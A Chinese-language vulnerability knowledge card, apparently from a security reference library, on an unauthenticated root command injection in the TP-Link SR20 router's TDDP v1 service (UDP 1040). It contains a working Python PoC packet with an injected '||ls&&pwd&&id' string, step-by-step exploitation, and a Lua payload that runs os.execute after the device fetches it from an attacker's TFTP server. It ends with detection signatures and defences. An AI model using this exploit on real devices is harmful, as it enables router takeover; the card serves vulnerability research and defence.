---
id: iot-tplink-sr20-tddp-v1-udp-cmd-injection-lua
title: TP-Link SR20 TDDP v1（UDP 1040）未授权命令注入：CMD_FTEST_CONFIG 的 tftp 拼接与 Lua config_test 加载执行
type: scenario
domain: iot
path: iot
technique: tplink-sr20-tddp-v1-cmd-injection
aliases:
- TDDP v1 命令注入
- TP-Link SR20 RCE
- tddp_parserVerOneOpt
- CMD_FTEST_CONFIG
- 0x0131 载荷
- tddp tftp lua
tags:
- iot
- router
- tplink
- tddp
- udp
- command-injection
- unauthenticated
- rce
- firmware
- lua
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: TDDP v1（TP-Link SR20，固件 SR20(US)_V1_180518）
verification:
  verified_by: verifier-T1-24
  verified_at: '2026-11-08T13:34:16+08:00'
  notes: 已对照原文核对：TDDP v1无认证/UDP1040/第二字节0x31→tftp下载+lua root执行(图01)、EXP1命令注入uid=0(图17用户级、图18系统级)、demo.lua加载config_test执行(图20)全支撑；affected_versions=TDDP v1/TP-Link SR20/固件SR20(US)_V1_180518均原文明确；dedup top候选为自身，其余AX1800/DI-8100/DIR-605L均不同链；cve留空未猜正确；卡无sources字段(原文参考链接为CSDN/博客)；未验证点：未在真机验证，卡内已注明
---

## 一句话结论

TP-Link SR20 的 `/usr/bin/tddp` 在 TDDP v1 下对 UDP 1040 的数据包不做任何身份验证，包内第二字节为 `0x31`（CMD_FTEST_CONFIG）时，处理函数用 `sscanf(payload, "%[^;];%s", s, v9)` 取出两段后把 `s` 直接拼进 `cd /tmp;tftp -gr %s %s &` 执行；由于分隔符 `;` 已被 sscanf 占用，攻击者改用 `||`/`&&`/反引号即可注入任意命令，还能让设备从攻击者 TFTP 拉取 Lua 文件并以 root 调用其 `config_test` 函数，形成未授权 RCE。

## 原理

- TDDP 是 TP-Link 设备发现/配置协议，v1 与 v2 并存：v1 既不做身份校验，也不加密载荷，任何能发包到 UDP 1040 的主机都会被处理；v2 才引入认证与加密。因此 v1 设备上「谁能发包，谁就能进业务分支」。
- `tddp` 主流程：`socket(AF_INET, SOCK_DGRAM)` → `bind(1040)` → `select` 循环（600 秒超时）→ `recvfrom` 把报文读进 `a1+45083` 缓冲区 → 首字节判协议版本，`*v16 == 1` 走 v1 分支 → 在 `tddp_parserVerOneOpt` 里用第二字节 `switch` 分派命令。
- 命中 `0x31`（`CMD_FTEST_CONFIG`）进入 `sub_A580`：v1 下把数据指针后移 12 字节（1 字节版本 + 1 字节命令 + 10 字节保留/长度字段），再用 `sscanf(v18, "%[^;];%s", s, v9)` 切分——第一段 `s` 读到 `;` 为止，第二段 `v9` 为 `;` 之后的内容，两者非空才继续。
- 随后执行 `sub_91DC("cd /tmp;tftp -gr %s %s &", s, inet_ntoa(源IP))`，`sub_91DC` 内部 `fork()` + `execl("/bin/sh","-c",cmd)`，命令以 root 运行。`s` 未做字符过滤，直接进入 shell 语法位置。
- 为什么不能用 `;` 注入：`sscanf` 的 `%[^;]` 把 `;` 当作字段终止符，注入串里的第一个 `;` 会被吃掉；改用 `||`、`&&`、反引号、`$()` 等不依赖分号的连接符即可，`tftp -gr` 因缺少参数失败后正好由 `||` 接管后续命令。
- 下载完成后程序轮询 `/tmp/<s>` 是否存在，存在则 `luaL_openlibs` + `luaL_loadfile` + `lua_getfield("config_test")` + `lua_call(2 参数)`；参数分别是 `v9` 与请求源 IP。于是「命令注入」还能升级为「让设备执行攻击者提供的 Lua 代码」，且 Lua 里的 `os.execute` 同样以 root 运行。

## 触发条件

- 目标为运行 TDDP v1 的 TP-Link SR20（同代 v1 固件），UDP 1040 可达；
- 无需认证，v1 分支不校验来源、不做载荷加密；
- 报文长度至少覆盖 12 字节头 + 非空两段（以 `;` 分隔）；
- Lua 执行路径还需设备侧存在 tftp 客户端且能从攻击者地址下载文件（源 IP 由 `inet_ntoa` 取，不能任意指定，攻击者需让设备回连到自己）。

## 利用步骤

1. 确认 1040/udp 开放（`nmap -sU -p1040`），或直接发探测包观察设备是否回包。
2. 构造 v1 报文：`\x01`（版本）+ `\x31`（CMD_FTEST_CONFIG）+ 10 字节填充 + 注入串。
3. 命令注入验证：注入串形如 `||id`，设备侧 `tftp -gr` 失败后执行 `id`，命令回显出现在设备控制台/串口（调试环境）或通过带外方式确认。
4. 需要更强控制时：把第一段设为 Lua 文件名（如 `demo.lua`），在本机起 TFTP 服务放置 Lua 脚本，第二段设为传给 `config_test` 的参数。
5. 设备下载并执行 Lua，`config_test(para1, para2)` 内 `os.execute` 实现任意命令；`para1` 可控，`para2` 为攻击者 IP。
6. 复现环境：user 模式 `chroot . ./qemu-arm-static -g 1234 ./usr/bin/tddp` 便于断点调试；system 模式用 `qemu-system-arm -M vexpress-a9` 启动 Debian armhf、配 br0/tap0、把 squashfs-root 打包 scp 进虚拟机后运行 tddp，发包验证。

## PoC

命令注入（UDP 1040）：

```python
from socket import *
s = socket(AF_INET, SOCK_DGRAM, 0)
payload  = b'\x01\x31'          # version=1, cmd=CMD_FTEST_CONFIG(0x31)
payload += b'a' * 10            # 10 字节填充，v1 分支从 +12 开始解析
payload += b"||ls&&pwd&&id&&666;aaa"
s.sendto(payload, ("127.0.0.1", 1040))
s.close()
```

设备侧实际执行的命令：

```sh
cd /tmp;tftp -gr ||ls&&pwd&&id&&666 127.0.0.1 &
```

Lua 加载执行（第二段作为 `config_test` 的第一个参数）：

```lua
function config_test(para1, para2)
    os.execute("id")
    os.execute(para1)   -- 可控
    os.execute(para2)   -- 为请求源 IP，不可控
end
```

## 变体与关联

- 同协议其它命令分支（`0x04` CMD_AUTO_TEST、`0x06` CMD_CONFIG_MAC、`0x07` CMD_CANCEL_TEST、`0x0D` CMD_CONFIG_PIN、`0x30` CMD_FTEST_USB）也走 `tddp_parserVerOneOpt` 分派，是否同样存在拼接需按版本逆向确认。
- 若设备已升到 TDDP v2，v1 报文会被拒，需转向认证/加密缺陷；不要把本卡结论套到 v2。
- 关联：[[iot-tplink-ax1800-luci-locale-country-command-injection]]（同为 TP-Link 未授权命令注入，但入口是 HTTP luci，注入点在 `popen` 的 country 参数）；[[code-analysis-reverse-firmware-arm32-qemu-user-chroot-patch-br0]]、[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（固件仿真方法）。

## 检测与防御

- 检测：UDP 1040 上出现首字节 `0x01`、第二字节 `0x31` 的报文；载荷中出现 `||`、`&&`、反引号、`tftp -gr`、`/tmp/` 等特征；设备向外发起 TFTP（69/udp）请求。
- 检测：`/tmp` 下出现非预期 `.lua` 文件；`tddp` 进程日志出现 `tddp_cmd_configSet`、`lua file [...] don't exsit`、`tddp_execCmd` 且命令串非预期。
- 防御：升级到 TDDP v2 固件或关闭 TDDP/限制 1040 仅管理网可达；边界封禁 1040/udp 与设备出向 TFTP；把设备管理面放入独立 VLAN；无法升级时用 ACL 只允许可信运维地址访问。
